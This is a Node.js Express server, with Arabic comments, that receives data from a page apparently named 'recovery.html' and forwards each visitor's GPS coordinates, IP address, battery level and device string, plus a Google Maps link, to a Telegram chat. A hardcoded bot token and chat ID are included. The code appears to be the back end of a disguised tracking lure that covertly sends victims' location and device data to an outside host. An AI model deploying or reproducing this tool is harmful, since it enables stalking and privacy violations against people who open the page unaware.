const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const app = express();

const BOT_TOKEN = "8563711770:AAFZ7XOWXsBbXBKhHy8KLIHtXoStWEIrLdE";
const CHAT_ID = "7060104540";

app.use(bodyParser.json());

// استقبال رسائل Telegram
app.post('/bot', (req, res) => {
  const update = req.body;
  if (update.message && update.message.text === "/start") {
    axios.get(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=تم تشغيل البوت بنجاح! ✔`)
      .then(() => res.sendStatus(200))
      .catch(err => res.send(err));
  } else {
    res.sendStatus(200);
  }
});

// استقبال بيانات من recovery.html
app.post('/send', (req, res) => {
  const data = req.body;
  let msg = `📱 تم فتح الصفحة!\n`;
  msg += `📍 GPS: ${data.lat}, ${data.lon}\n`;
  msg += `💻 IP: ${data.ip}\n`;
  msg += `🔋 Battery: ${data.battery}\n`;
  msg += `📱 Device: ${data.ua}\n`;
  msg += `🌍 خريطة: https://www.google.com/maps?q=${data.lat},${data.lon}`;

  axios.get(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`)
    .then(() => res.sendStatus(200))
    .catch(err => res.send(err));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Bot running on port ${PORT}`));
